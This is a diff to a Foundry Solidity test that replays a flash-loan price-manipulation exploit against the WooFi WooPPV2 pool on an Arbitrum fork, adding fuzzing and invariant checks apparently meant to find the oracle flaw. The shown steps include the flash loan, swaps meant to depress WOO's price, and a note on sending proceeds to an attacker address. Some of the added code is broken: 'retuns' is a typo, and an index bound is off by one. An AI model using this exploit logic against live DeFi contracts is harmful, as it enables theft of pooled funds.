@@ -35,8 +35,45 @@ contract WOOFiAttacker is Test {
         REENTRANT
     }
 
+    address[] swapTokens;
+
+    function swapWrapper(uint8 fromIndex, uint8 toIndex, uint256 fromAmount) public {
+        // instruct fuzzer to cap fromAmount under pool's
+        // available amount to prevent wasted runs
+        // vm.assume(fromAmount <= QUOTE_AMOUNT);
+
+        vm.assume(fromIndex <= swapTokens.length);
+        vm.assume(toIndex <= swapTokens.length);
+
+        address fromToken = swapTokens[fromIndex];
+        address toToken = swapTokens[toIndex];
+
+        deal(fromToken, address(this), fromAmount);
+
+        IERC20(fromToken).transfer(address(WOOPPV2), fromAmount);
+        WOOPPV2.swap(fromToken, toToken, fromAmount, 0, address(this), address(this));
+    }
+
+    constructor() payable {
+        setUp();
+    }
+
     function setUp() public {
-        // WooPPV2 pp = new WooPPV2(USDC);
+        targetContract(address(WOOPPV2));
+        bytes4[] memory selectors = new bytes4[](1);
+        selectors[0] = this.swapWrapper.selector;
+
+        targetSelector(FuzzSelector({
+            addr: address(this),
+            selectors: selectors
+        }));
+
+        address[] memory tokens = new address[](3);
+        tokens[0] = USDC;
+        tokens[1] = WETH;
+        tokens[2] = WOO;
+        swapTokens = tokens;
+
         bytes32 txHash = 0x57e555328b7def90e1fc2a0f7aa6df8d601a8f15803800a5aaf0a20382f21fbd;
         vm.createSelectFork("arb", txHash);
         vm.etch(address(WOOPPV2), address(deployCode('WooPPV2.sol', abi.encode(USDC))).code);
@@ -55,7 +92,7 @@ contract WOOFiAttacker is Test {
         // ILBFlashLoanCallback receiver, bytes32 amounts, bytes calldata data
         // flash loan WOO
         traderJoeFlashAmount = IERC20(WOO).balanceOf(address(TRADERJOE));
-        console.log("TJ Flash Amount: ", traderJoeFlashAmount, "WOO");
+        console.log("TJ Flash Amount: ", traderJoeFlashAmount / 1e18, "WOO");
         console.log("");
         bytes32 hashAmount = bytes32(traderJoeFlashAmount);
         TRADERJOE.flashLoan(ILBFlashLoanCallback(address(this)), hashAmount, new bytes(0));
@@ -88,8 +125,8 @@ contract WOOFiAttacker is Test {
         console.log("WETH balance:", IERC20(WETH).balanceOf(address(this)) / 1e18, "WETH");
         console.log("");
 
-        // 4 consecutive swaps (to mess with pricing updates):
-        // Sets up the WOO to be cheap
+        // // 4 consecutive swaps (to mess with pricing updates):
+        // // Sets up the WOO to be cheap
         // 1. USDC -> WETH to update the USDC oracle
         IERC20(USDC).transfer(address(WOOPPV2), 2000000000000);
         WOOPPV2.swap(USDC, WETH, 2000000000000, 0, address(this), address(this));
@@ -170,6 +207,14 @@ contract WOOFiAttacker is Test {
         IWETH(WETH).withdraw(excessWETHBalance);
         uint256 excessWOOBalance = IERC20(WOO).balanceOf(address(this));
         //IERC20(WOO).transfer({some_other_address}, excessWOOBalance); // would only need to do this if sending to an attaker EOA
+    }
+
+    // function invariant_testInvariant() public view {
+    //     assert(_getPrice(WOO) > 1e8);
+    // }
+
+    function invariant_testInvariantEchidna() public view retuns(bool) {
+        return(_getPrice(WOO) > 1e8);
     }
 
     function testAttack() public {
